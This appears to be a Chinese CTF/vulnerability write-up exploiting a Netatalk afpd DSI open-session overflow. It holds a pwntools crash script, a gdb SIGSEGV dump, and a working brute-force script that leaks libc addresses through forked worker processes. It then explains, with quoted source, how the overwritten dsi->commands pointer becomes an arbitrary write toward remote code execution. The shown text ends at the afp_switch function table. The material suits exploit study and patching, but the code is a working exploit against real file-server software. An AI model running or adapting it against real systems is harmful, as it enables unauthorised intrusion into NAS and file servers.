<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">5566</span></span><br><span class="line"><span class="comment">#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="comment">#sock.connect((ip, port))</span></span><br><span class="line">sock = remote(ip,port)</span><br><span class="line"></span><br><span class="line">dsi_opensession = <span class="string">"\x01"</span> <span class="comment"># attention quantum option</span></span><br><span class="line">dsi_opensession += <span class="string">"\x80"</span> <span class="comment"># length</span></span><br><span class="line">dsi_opensession += <span class="string">"\x00\x00\x40\x00"</span> <span class="comment"># client quantum</span></span><br><span class="line">dsi_opensession += <span class="string">"\x00\x00\x00\x04"</span> <span class="comment"># overwrites datasize</span></span><br><span class="line">dsi_opensession += struct.pack(<span class="string">"I"</span>, <span class="number">0xdeadbeef</span>) <span class="comment"># server quantum</span></span><br><span class="line">dsi_opensession += <span class="string">"\x00\x00\x00\x04"</span> <span class="comment"># server ID + Client ID</span></span><br><span class="line">dsi_opensession += <span class="string">"a"</span>*<span class="number">0x80</span> <span class="comment"># server ID + Client ID</span></span><br><span class="line"></span><br><span class="line">dsi_header = <span class="string">"\x00"</span> <span class="comment"># "request" flag</span></span><br><span class="line">dsi_header += <span class="string">"\x04"</span> <span class="comment"># open session command</span></span><br><span class="line">dsi_header += <span class="string">"\x00\x01"</span> <span class="comment"># request id</span></span><br><span class="line">dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># data offset</span></span><br><span class="line">dsi_header += struct.pack(<span class="string">"&gt;I"</span>, len(dsi_opensession))</span><br><span class="line">dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># reserved</span></span><br><span class="line">dsi_header += dsi_opensession</span><br><span class="line"></span><br><span class="line">sock.send(dsi_header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">sock.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RDX: 0x0 </span><br><span class="line">RSI: 0x7f5d56be2092 (<span class="string">'a'</span> &lt;repeats 16 <span class="built_in">times</span>&gt;)</span><br><span class="line">RDI: 0x55e3c21e9098 --&gt; 0x0 </span><br><span class="line">RBP: 0x55e3c21e8940 --&gt; 0x0 </span><br><span class="line">RSP: 0x7fff744c2c80 --&gt; 0x0 </span><br><span class="line">RIP: 0x7f5d56491fbb (&lt;dsi_opensession+139&gt;:	movzx  eax,BYTE PTR [rcx+r9*1])</span><br><span class="line">R8 : 0x55e3c21e9018 --&gt; 0x400000000004000 </span><br><span class="line">R9 : 0x1 </span><br><span class="line">R10: 0x25 (<span class="string">'%'</span>)</span><br><span class="line">R11: 0x293 </span><br><span class="line">R12: 0x55e3c21e30d0 --&gt; 0x55e3c21e53b0 --&gt; 0x0 </span><br><span class="line">R13: 0x1e </span><br><span class="line">R14: 0x7fff744c2d80 --&gt; 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10206 (carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7f5d56491fad &lt;dsi_opensession+125&gt;:	mov    eax,DWORD PTR [rbx+0x6d8]</span><br><span class="line">   0x7f5d56491fb3 &lt;dsi_opensession+131&gt;:	bswap  eax</span><br><span class="line">   0x7f5d56491fb5 &lt;dsi_opensession+133&gt;:	mov    DWORD PTR [rbx+0x6d8],eax</span><br><span class="line">=&gt; 0x7f5d56491fbb &lt;dsi_opensession+139&gt;:	movzx  eax,BYTE PTR [rcx+r9*1]</span><br><span class="line">   0x7f5d56491fc0 &lt;dsi_opensession+144&gt;:	lea    esi,[rdx+rax*1+0x2]</span><br><span class="line">   0x7f5d56491fc4 &lt;dsi_opensession+148&gt;:	cmp    rsi,QWORD PTR [rbx+0x106f8]</span><br><span class="line">   0x7f5d56491fcb &lt;dsi_opensession+155&gt;:	mov    rdx,rsi</span><br><span class="line">   0x7f5d56491fce &lt;dsi_opensession+158&gt;:	jb     0x7f5d56491f80 &lt;dsi_opensession+80&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fff744c2c80 --&gt; 0x0 </span><br><span class="line">0008| 0x7fff744c2c88 --&gt; 0x7f5d56491c63 (&lt;dsi_getsession+467&gt;:	mov    QWORD PTR [r14],0x0)</span><br><span class="line">0016| 0x7fff744c2c90 --&gt; 0x0 </span><br><span class="line">0024| 0x7fff744c2c98 --&gt; 0x600000005 </span><br><span class="line">0032| 0x7fff744c2ca0 --&gt; 0x7a00000071 (<span class="string">'q'</span>)</span><br><span class="line">0040| 0x7fff744c2ca8 --&gt; 0x7f5d568ae0da (<span class="string">"Operation not permitted"</span>)</span><br><span class="line">0048| 0x7fff744c2cb0 --&gt; 0x55e3c21e8ee8 --&gt; 0x8229a8c0be150002 </span><br><span class="line">0056| 0x7fff744c2cb8 --&gt; 0x1 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x00007f5d56491fbb <span class="keyword">in</span> dsi_opensession () from /lib/libatalk.so.18</span><br><span class="line">gdb-peda$ bt</span><br><span class="line"><span class="comment">#0  0x00007f5d56491fbb in dsi_opensession () from /lib/libatalk.so.18</span></span><br><span class="line"><span class="comment">#1  0x00007f5d56491c63 in dsi_getsession () from /lib/libatalk.so.18</span></span><br><span class="line"><span class="comment">#2  0x000055e3c0fc6645 in main ()</span></span><br><span class="line"><span class="comment">#3  0x00007f5d5671bb97 in __libc_start_main () from ./libc.so</span></span><br><span class="line"><span class="comment">#4  0x000055e3c0fc6eaa in _start ()</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>这个CVE的发现者在NAS上写了个exp，对应的binary编译的时候没有开PIE，因此通过一个利用链可以直接rce，不过我们手头这个是在ubuntu18.04开了PIE编译的，地址泄露是所有利用的开始，这一点也是去年卡住我的原因，今年再回来看这道题的时候搜了下资料，找到了<code>ruan</code>师傅和<code>hitcon2019 qual</code>的exp，终于弄明白了破局之道。答案就是侧信道，这一点我也在TSCTF2020出了道题考别人，结果到自己就想不起来了2333。afpd和apache很相似，都是每次接收到一个请求就会fork出一个新的进程来处理，因此进程的地址空间是不变的，刚才我们提到了发送正常包的时候返回数据里包含有<code>server_quantum</code>，因此我们可以使用部分写的方式，单字节修改<code>dsi-&gt;commands</code>，每次修改之后查看返回包，当发生crash时不会有数据包，反之数据包中包含有我们提前设置的特殊值，据此我们可以得到一个合法的地址值。再根据这个地址同libc基址的偏移关系(偏移固定)计算得到libc_base，爆破的代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.update(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#ip = 'localhost'</span></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">5566</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_header</span><span class="params">(addr)</span>:</span></span><br><span class="line">    dsi_opensession = <span class="string">"\x01"</span> <span class="comment"># attention quantum option</span></span><br><span class="line">    dsi_opensession += chr(len(addr)+<span class="number">0x10</span>) <span class="comment"># length</span></span><br><span class="line">    dsi_opensession += <span class="string">"a"</span>*<span class="number">0x10</span>+addr</span><br><span class="line">    dsi_header = <span class="string">"\x00"</span> <span class="comment"># "request" flag</span></span><br><span class="line">    dsi_header += <span class="string">"\x04"</span> <span class="comment"># open session command</span></span><br><span class="line">    dsi_header += <span class="string">"\x00\x01"</span> <span class="comment"># request id</span></span><br><span class="line">    dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># data offset</span></span><br><span class="line">    dsi_header += struct.pack(<span class="string">"&gt;I"</span>, len(dsi_opensession))</span><br><span class="line">    dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># reserved</span></span><br><span class="line">    dsi_header += dsi_opensession</span><br><span class="line">    <span class="keyword">return</span> dsi_header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> len(addr)&lt;<span class="number">6</span> :</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        r = remote(ip,port)</span><br><span class="line">        r.send(create_header(addr+chr(i)))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"a"</span>*<span class="number">4</span> <span class="keyword">in</span> r.recvrepeat(<span class="number">1</span>):</span><br><span class="line">                addr += chr(i)</span><br><span class="line">                r.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r.close()</span><br><span class="line">    val = u64(addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(val)</span><br><span class="line">addr += <span class="string">"\x00"</span>*<span class="number">2</span></span><br><span class="line">libc_addr = u64(addr)</span><br><span class="line">log.success(<span class="string">"[+]Now we got an addresss &#123;&#125;"</span>.format(hex(libc_addr)))</span><br><span class="line"><span class="comment">#libc_base = 0x00007f012bf17000</span></span><br><span class="line">offset = <span class="number">0xca1000</span></span><br><span class="line">libc_base = libc_addr - offset</span><br><span class="line">log.success(<span class="string">"[+]libc base &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">libc.address = libc_base</span><br></pre></td></tr></table></figure>
<h3 id="从任意地址写到RCE"><a href="#从任意地址写到RCE" class="headerlink" title="从任意地址写到RCE"></a>从任意地址写到RCE</h3><p>源码中搜一下对于<code>dsi-&gt;commands</code>的引用，可以找到一处<code>dsi_stream_receive</code>函数的赋值<code>dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen)</code>，函数的注释表明这是一个对于dsi-&gt;commands赋值的函数，查看一下对于这个函数的引用，在<code>afp_over_dsi</code>函数中有个循环会调用此函数，读取完毕后若<code>cmd=2(DSIFUNC_CMD)</code>，则以<code>dsi-&gt;commands[0]</code>为索引，<code>err = (*afp_switch[function])(obj,(char *)dsi-&gt;commands, dsi-&gt;cmdlen,(char *)&amp;dsi-&gt;data, &amp;dsi-&gt;datalen);</code>调用afp_switch函数表的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Read DSI command and data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param  dsi   (rw) DSI handle</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return    DSI function on success, 0 on failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dsi_stream_receive</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> block[DSI_BLOCKSIZ];</span><br><span class="line"></span><br><span class="line">  LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: START"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;flags &amp; DSI_DISCONNECTED)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* read in the header */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_buffered_stream_read(dsi, (<span class="keyword">uint8_t</span> *)block, <span class="keyword">sizeof</span>(block)) != <span class="keyword">sizeof</span>(block)) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">  dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_command == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">  dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">  dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) &#123;</span><br><span class="line">      LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">      dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  LOG(log_debug, logtype_dsi, <span class="string">"dsi_stream_receive: DSI cmdlen: %zd"</span>, dsi-&gt;cmdlen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afp_over_dsi</span><span class="params">(AFPObj *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">     <span class="comment">/* get stuck here until the end */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sigsetjmp(recon_jmp, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">            <span class="comment">/* returning from SIGALARM handler for a primary reconnect */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Blocking read on the network socket */</span></span><br><span class="line">        cmd = dsi_stream_receive(dsi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">     <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">         <span class="keyword">case</span> DSIFUNC_CMD:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> AFS</span></span><br><span class="line">            <span class="keyword">if</span> ( writtenfork ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( flushfork( writtenfork ) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">                    LOG(log_error, logtype_afpd, <span class="string">"main flushfork: %s"</span>, strerror(errno) );</span><br><span class="line">                &#125;</span><br><span class="line">                writtenfork = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* AFS */</span></span></span><br><span class="line"></span><br><span class="line">            function = (u_char) dsi-&gt;commands[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* AFP replay cache */</span></span><br><span class="line">            rc_idx = dsi-&gt;clientID % REPLAYCACHE_SIZE;</span><br><span class="line">            LOG(log_debug, logtype_dsi, <span class="string">"DSI request ID: %u"</span>, dsi-&gt;clientID);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (replaycache[rc_idx].DSIreqID == dsi-&gt;clientID</span><br><span class="line">                &amp;&amp; replaycache[rc_idx].AFPcommand == function) &#123;</span><br><span class="line">                LOG(log_note, logtype_afpd, <span class="string">"AFP Replay Cache match: id: %u / cmd: %s"</span>,</span><br><span class="line">                    dsi-&gt;clientID, AfpNum2name(function));</span><br><span class="line">                err = replaycache[rc_idx].result;</span><br><span class="line">            <span class="comment">/* AFP replay cache end */</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* send off an afp command. in a couple cases, we take advantage</span></span><br><span class="line"><span class="comment">                 * of the fact that we're a stream-based protocol. */</span></span><br><span class="line">                <span class="keyword">if</span> (afp_switch[function]) &#123;</span><br><span class="line">                    dsi-&gt;datalen = DSI_DATASIZ;</span><br><span class="line">                    dsi-&gt;flags |= DSI_RUNNING;</span><br><span class="line"></span><br><span class="line">                    LOG(log_debug, logtype_afpd, <span class="string">"&lt;== Start AFP command: %s"</span>, AfpNum2name(function));</span><br><span class="line"></span><br><span class="line">                    AFP_AFPFUNC_START(function, (<span class="keyword">char</span> *)AfpNum2name(function));</span><br><span class="line">                    err = (*afp_switch[function])(obj,</span><br><span class="line">                                                  (<span class="keyword">char</span> *)dsi-&gt;commands, dsi-&gt;cmdlen,</span><br><span class="line">                                                  (<span class="keyword">char</span> *)&amp;dsi-&gt;data, &amp;dsi-&gt;datalen);</span><br><span class="line"></span><br><span class="line">                    AFP_AFPFUNC_DONE(function, (<span class="keyword">char</span> *)AfpNum2name(function));</span><br><span class="line">                    LOG(log_debug, logtype_afpd, <span class="string">"==&gt; Finished AFP command: %s -&gt; %s"</span>,</span><br><span class="line">                        AfpNum2name(function), AfpErr2name(err));</span><br><span class="line"></span><br><span class="line">                    dir_free_invalid_q();</span><br><span class="line"></span><br><span class="line">                    dsi-&gt;flags &amp;= ~DSI_RUNNING;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Add result to the AFP replay cache */</span></span><br><span class="line">                    replaycache[rc_idx].DSIreqID = dsi-&gt;clientID;</span><br><span class="line">                    replaycache[rc_idx].AFPcommand = function;</span><br><span class="line">                    replaycache[rc_idx].result = err;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数指针数组成员如下，默认为未登录状态，因此只能使用下面的函数指针，当用户登陆之后该表会被重新赋值为另一个数组。当idx=0时函数指针为NULL，在函数中不会进行调用而直接break掉，再找下这个函数的调用，好巧不巧这就是<code>dsi_start</code>中对于子进程处理的函数，因此必然会调用到这个函数。</p>
<p>那么到现在我们可以先通过memcpy覆写dsi-&gt;commands指针，再通过<code>dsi_stream_read</code>实现任意地址写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AFPCmd *afp_switch = preauth_switch;</span><br><span class="line"></span><br><span class="line">AFPCmd postauth_switch[] = &#123;</span><br><span class="line">    <span class="literal">NULL</span>, afp_bytelock, afp_closevol, afp_closedir,</span><br><span class="line">    afp_closefork, afp_copyfile, afp_createdir, afp_createfile,	<span class="comment">/*   0 -   7 */</span></span><br><span class="line">    afp_delete, afp_enumerate, afp_flush, afp_flushfork,</span><br><span class="line">    afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,	<span class="comment">/*   8 -  15 */</span></span><br><span class="line">    afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,</span><br><span class="line">    afp_logout, afp_mapid, afp_mapname, afp_moveandrename,	<span class="comment">/*  16 -  23 */</span></span><br><span class="line">    afp_openvol, afp_opendir, afp_openfork, afp_read,</span><br><span class="line">    afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,</span><br><span class="line">    <span class="comment">/*  24 -  31 */</span></span><br><span class="line">    afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,</span><br><span class="line">    afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, <span class="comment">/*  32 -  39 */</span></span><br><span class="line">    afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,</span><br><span class="line">    afp_null, afp_null, afp_null, afp_null,			<span class="comment">/*  40 -  47 */</span></span><br><span class="line">    afp_opendt, afp_closedt, afp_null, afp_geticon,</span><br><span class="line">    afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,	<span class="comment">/*  48 -  55 */</span></span><br><span class="line">    afp_addcomment, afp_rmvcomment, afp_getcomment, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  56 -  63 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  64 -  71 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, afp_syncdir, afp_syncfork,	<span class="comment">/*  72 -  79 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  80 -  87 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/*  88 -  95 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    afp_getdiracl, afp_setdiracl, afp_afschangepw, <span class="literal">NULL</span>,	<span class="comment">/*  96 - 103 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 104 - 111 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 112 - 119 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 120 - 127 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 128 - 135 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 136 - 143 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 144 - 151 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 152 - 159 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 160 - 167 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 168 - 175 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 176 - 183 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 184 - 191 */</span></span><br><span class="line">    afp_addicon, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 192 - 199 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 200 - 207 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 208 - 215 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 216 - 223 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 224 - 231 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 232 - 239 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 240 - 247 */</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,					<span class="comment">/* 248 - 255 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
